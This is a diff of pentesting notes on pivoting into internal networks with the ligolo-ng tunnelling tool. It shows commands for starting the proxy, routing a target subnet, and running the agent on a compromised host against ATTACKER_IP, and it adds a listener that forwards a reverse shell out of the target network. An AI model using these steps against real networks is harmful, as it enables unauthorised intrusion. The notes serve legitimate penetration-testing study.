@@ -9,7 +9,7 @@ description: >-
 
 {% embed url="https://github.com/tnpitsecurity/ligolo-ng" %}
 
-<figure><img src="../../.gitbook/assets/Untitled Diagram (4).jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled Diagram (4).jpg" alt=""><figcaption> A classic scenario for pivoting use cases</figcaption></figure>
 
 ### Setting up Ligolo-ng
 
@@ -79,27 +79,38 @@ TODO :)
 
 ### 1. Accessing the Target Network
 
-Once you have gained access to the Public Facing Server that is in the Target Network, you can to access/enumerate or exploit any vulnerabilities against a different target in the same network using the very own tools from the attacking machine.
+Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo allowing an attcker to use their very own tools from the attacking machine.
 
 ```
-# 1. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs
+# 1. Follow the ligolo setup process and start the ligolo proxy on the attacking machine 
+./proxy -selfcert -laddr 0.0.0.0:9901
 
-# 2. Initiate a connection from the ligolo agent to the ligolo proxy
-./agent -connect ATTACKER_IP:9901
-
-# 1. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
+# 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
 sudo ip route add 192.168.0.0/24 dev ligolo
 
-# 2. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)
+# 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs
 
-# 3. Once selected, type : 
-Start
+# 4. Initiate a connection from the ligolo agent to the ligolo proxy
+./agent -connect ATTACKER_IP:9901
+
+# 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)
+
+# 6. Once selected, type : 
+start
 
 //This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel
 //Allowing you to use any tool from the attacking maching against the new target machine
 ```
-![image](https://user-images.githubusercontent.com/90450439/221322376-4f8ff91f-54c9-4cef-8e52-2d824340b089.png)
+![image](https://user-images.githubusercontent.com/90450439/221353322-0abc5b8e-01dd-491a-b3f7-0a3b050393ac.png)
 
-### 1. Accessing the Internal Network
+### 1.1 Forwarding a reverse shell from the Target Network
 
-TODO
+```
+
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
+```
+![image](https://user-images.githubusercontent.com/90450439/221354631-dbcb392f-af06-49d8-a63c-c5c03201c2cd.png)
+
+### 2. Accessing the Internal Network
+
+Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo allowing an attcker to use their very own tools from the attacking machine.
